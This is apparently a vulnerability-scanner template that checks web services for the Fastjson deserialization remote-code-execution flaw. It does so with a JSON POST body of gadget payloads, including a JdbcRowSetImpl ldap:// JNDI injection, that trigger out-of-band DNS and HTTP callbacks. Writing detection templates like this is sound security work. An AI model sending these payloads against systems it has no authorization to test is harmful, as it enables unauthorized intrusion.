id: fastjson-rce-all

info:
  name: Fastjson Deserialization RCE
  author: zan8in
  severity: critical
  verified: true
  tags: fastjson,rce
  created: 2024/01/22

set:
  oob.DNS: oob.DNS
  oob.HTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /
      headers:
        Content-Type: application/json
      body: |
        {"a":{"@type":"java.net.Inet4Address","val":"{{oob.DNS}}"},"b":{"@type":"java.net.Inet6Address","val":"{{oob.DNS}}"},"c":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{oob.DNS}}"}},"d":{{"@type":"java.net.URL","val":"{{oob.HTTP}}"}:"x"},"e":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{oob.DNS}}","autoCommit":true},"f":{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{oob.DNS}}","autoCommit":true}}},"g":{"@type":"javax.swing.JEditorPane","page":"{{oob.HTTP}}"},"h":{"@type":"com.alibaba.fastjson.JSONObject",
        {"@type": "java.net.URL","val":"{{oob.HTTP}}"}}""}}
    expression: oobCheck( oob.ProtocolDNS, 3)
expression: r0()
